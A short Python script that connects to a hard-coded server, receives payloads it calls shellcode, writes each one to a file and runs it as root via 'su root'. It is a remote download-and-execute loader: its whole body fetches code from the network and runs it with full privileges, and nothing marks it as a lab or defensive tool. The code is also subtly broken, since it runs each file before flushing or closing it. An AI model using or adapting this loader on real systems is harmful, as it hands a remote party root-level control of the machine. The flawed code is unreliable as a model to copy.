#!/usr/bin/python3

import os
import socket

ip = '172.31.45.126'
port = 9999

def exec_shell(shellfile):
    os.system("su root ./" + shellfile)

client = socket.socket()
client.connect((ip, port))
print("connected with server")

client.sendall("shell_code".encode())

filename = './shellcodes/shellcode'
i=1

try:
     while True:
          shellfile = filename + str(i)
          with open(shellfile, 'w+') as f:
              data = client.recv(4)
              len = int.from_bytes(data, "little")
              print("쉘코드 전송 시작")
              data = client.recv(len)
              msg = data.decode()
              f.write(msg)
              exec_shell(shellfile)
              f.close()
          i=i+1

except Exception as ex:
     print(ex)

client.close()